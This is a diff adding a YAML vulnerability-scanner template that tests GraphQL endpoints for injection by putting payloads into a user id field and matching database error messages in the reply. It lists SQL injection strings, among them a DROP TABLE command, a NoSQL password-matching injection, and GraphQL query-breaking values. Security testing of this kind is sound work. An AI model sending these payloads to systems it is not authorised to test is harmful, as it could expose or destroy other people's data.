@@ -1,0 +1,53 @@
+# templates/graphql/graphql-injection.yaml
+id: graphql-injection
+info:
+  name: GraphQL Injection Vulnerability
+  author: shadowxp
+  severity: high
+  description: Tests for GraphQL injection vulnerabilities
+  tags:
+    - graphql
+    - injection
+    - sqli
+
+vulnerability_type: graphql
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "query": "query { user(id: \"{{graphql_payload}}\") { name email } }"
+      }
+    
+    matchers:
+      - type: word
+        words:
+          - "syntax error"
+          - "mysql"
+          - "postgresql" 
+          - "sqlite"
+          - "database error"
+        part: body
+      - type: regex
+        regex:
+          - "SQL.*error"
+          - "ORA-\\d+"
+        part: body
+
+payloads:
+  # SQL injection attempts
+  - "1' OR '1'='1"
+  - "1'; DROP TABLE users; --"
+  - "1' UNION SELECT 1,2,3 --"
+  # NoSQL injection
+  - "1\") || this.password.match(/.*/)//+%00"
+  # GraphQL specific
+  - "1\") { password }"
+  - "1' } user(id: \"2"
+
+encoders:
+  - json_encode
+  - url
